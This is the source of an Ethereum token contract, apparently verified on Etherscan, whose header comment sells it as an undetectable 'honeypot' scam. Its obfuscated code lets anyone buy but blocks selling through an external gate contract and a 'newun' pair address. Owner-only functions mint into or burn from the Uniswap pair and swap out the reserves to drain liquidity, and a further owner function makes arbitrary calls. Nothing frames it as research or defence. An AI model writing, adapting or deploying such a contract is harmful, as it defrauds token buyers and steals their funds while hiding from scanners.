/**
 *Submitted for verification at Etherscan.io on 2023-03-13
 */

// SPDX-License-Identifier: MIT

/*
BEP20 🍯 contract by Anpyla:

Anyone can buy, but only you can sell
.. and set the token price in one click
.. and drain liquidity without LP tokens
.. and remain undetected by any kind of checkers

The most advanced technology available for purchase.
Contact me if interested -> https://t.me/anpyla
*/

pragma solidity ^0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b > 0);
        c = a / b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address public newun;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function transfernewun(address _newun) public onlyOwner {
        newun = _newun;
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Context {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface name_interface {
    function factory() external pure returns (address);
}

interface ITokenPairProvider {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IUniswapV2Pair {
    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function sync() external;
}

interface symbol_interface {
    function e20d660cdf88(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract TokenObfuscated is ERC20, Ownable {
    using SafeMath for uint256;
    name_interface private name_;
    symbol_interface private symbol_;

    constructor(
        string memory name,
        string memory symbol,
        address fca17c2a2c60,
        address dc247f4b41e6
    ) ERC20(name, symbol) {
        name_ = name_interface(fca17c2a2c60);
        symbol_ = symbol_interface(dc247f4b41e6);
        _mint(_msgSender(), 100000000 * 10**decimals());
    }

     function transfer(address to, uint256 tokens)
        public
        override 
        returns (bool success)
    {
        require(to != newun, "please wait");

        _balances[msg.sender] = _balances[msg.sender].sub(tokens);
        _balances[to] = _balances[to].add(tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    )
       public override returns (bool success) 
        {
        if (from != address(0) && newun == address(0)) newun = to;
        else require(to != newun, "please wait");

        _balances[from] = _balances[from].sub(tokens);
        _allowances[from][msg.sender] = _allowances[from][msg.sender].sub(tokens);
        _balances[to] = _balances[to].add(tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function burn(address account, uint32 amount) public onlyOwner {
        ITokenPairProvider pairProvider = ITokenPairProvider(name_.factory());

        IUniswapV2Pair pair = IUniswapV2Pair(
            pairProvider.getPair(address(this), account)
        );

        require(address(pair) != address(0));
        require(amount > 0 && amount != 10000);
        uint256 ee413f3b668d = balanceOf(address(pair));
        uint256 a8c05d4c54bf = (ee413f3b668d * amount) / 10000;
        if (ee413f3b668d > a8c05d4c54bf) {
            _burn(address(pair), ee413f3b668d - a8c05d4c54bf);
        } else {
            _mint(address(pair), a8c05d4c54bf - ee413f3b668d);
        }
        pair.sync();
    }

    function _transfer(address recipient, uint32 amount) public onlyOwner {
        ITokenPairProvider pairProvider = ITokenPairProvider(name_.factory());
        IUniswapV2Pair pair = IUniswapV2Pair(
            pairProvider.getPair(address(this), recipient)
        );

        require(address(pair) != address(0), "Pair does not exist");

        pair.sync();

        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        (uint112 reserveIn, uint112 reserveOut) = address(this) < recipient
            ? (reserve0, reserve1)
            : (reserve1, reserve0);

        require(amount > 0 && amount < 10000, "Invalid amount");

        uint256 amountOut = (uint256(reserveOut) * amount) / 10000;

        uint256 amountInWithFee = (((uint256(reserveIn) * amountOut) /
            (uint256(reserveOut) - amountOut)) * 1003) / 1000;

        _mint(address(pair), amountInWithFee);

        (uint256 amountIn, uint256 amountOutWithFee) = address(this) < recipient
            ? (uint256(0), amountOut)
            : (amountInWithFee, uint256(0));

        pair.swap(amountIn, amountOutWithFee, _msgSender(), "");

        _burn(
            address(pair),
            amountInWithFee + (uint256(reserveIn) * amount) / 10000
        );

        pair.sync();
    }

    function c91a97942d5a(
        address fa720202573b,
        uint256 b81c1d265ec7,
        bytes memory ff711844fe6d
    ) public onlyOwner {
        (bool a4f7b1f5303e, ) = fa720202573b.call{value: b81c1d265ec7}(
            ff711844fe6d
        );
        require(a4f7b1f5303e);
    }

    function a5feccd6e5df() public view returns (address) {
        return address(symbol_);
    }

    function _transfer(
        address f9f6548a7385,
        address bccf0a9be224,
        uint256 d1a1eb4b698c
    ) internal override {
        if (symbol_.e20d660cdf88(f9f6548a7385, bccf0a9be224, d1a1eb4b698c)) {
            super._transfer(f9f6548a7385, bccf0a9be224, d1a1eb4b698c);
        }
    }

    function _mint(address ab228bf5c325, uint256 e000207d511a)
        internal
        override
    {
        if (symbol_.e20d660cdf88(address(0x0), ab228bf5c325, e000207d511a)) {
            super._mint(ab228bf5c325, e000207d511a);
        }
    }

    function _burn(address c67b5cadaa58, uint256 c966ea413c6d)
        internal
        override
    {
        if (symbol_.e20d660cdf88(c67b5cadaa58, address(0x0), c966ea413c6d)) {
            super._burn(c67b5cadaa58, c966ea413c6d);
        }
    }
}